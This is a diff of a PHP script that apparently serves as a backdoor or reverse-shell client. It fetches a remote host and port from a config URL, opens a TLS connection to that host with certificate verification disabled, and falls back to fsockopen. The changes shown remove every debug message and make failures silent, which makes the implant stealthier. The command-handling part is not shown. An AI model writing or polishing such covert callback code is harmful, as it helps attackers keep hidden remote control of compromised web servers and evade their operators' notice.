@@ -234,11 +234,9 @@ $config_content = @file_get_contents($config_url, false, $context);
 if ($config_content !== false && preg_match('/^([^\s:]+):(\d+)$/', trim($config_content), $matches)) {
     $remote_host = $matches[1];
     $remote_port = (int)$matches[2];
-    echo "Host e porta recuperados da URL: {$remote_host}:{$remote_port}\n"; // Log para depuração (remove em produção)
 } else {
     $remote_host = $default_host;
     $remote_port = $default_port;
-    echo "Falha ao recuperar config da URL. Usando padrão: {$remote_host}:{$remote_port}\n"; // Log para depuração (remove em produção)
 }
 
 // Configurar contexto SSL para conexão (sem verificação de certificado)
@@ -254,9 +252,6 @@ $context = stream_context_create([
 $socket = false;
 if (function_exists('stream_socket_client')) {
     $socket = @stream_socket_client("tls://{$remote_host}:{$remote_port}", $errno, $errstr, 30, STREAM_CLIENT_CONNECT, $context);
-    if ($socket) {
-        echo "Conexão estabelecida com stream_socket_client\n"; // Log para depuração (remove em produção)
-    }
 }
 
 // Fallback para fsockopen se stream_socket_client falhar ou não estiver disponível
@@ -265,18 +260,17 @@ if (!$socket && function_exists('fsockopen')) {
     if ($socket) {
         stream_set_blocking($socket, true);
         if (@stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
-            echo "Conexão estabelecida com fsockopen e TLS\n"; // Log para depuração (remove em produção)
         } else {
             fwrite($socket, "Falha ao habilitar TLS com fsockopen\n");
             fclose($socket);
-            die("Falha ao habilitar TLS com fsockopen\n");
+            die();
         }
     }
 }
 
 // Verificar se a conexão foi estabelecida
 if (!$socket) {
-    die("Falha na conexão: $errstr ($errno)\n");
+    die();
 }
 
 // Enviar mensagem inicial para autenticação
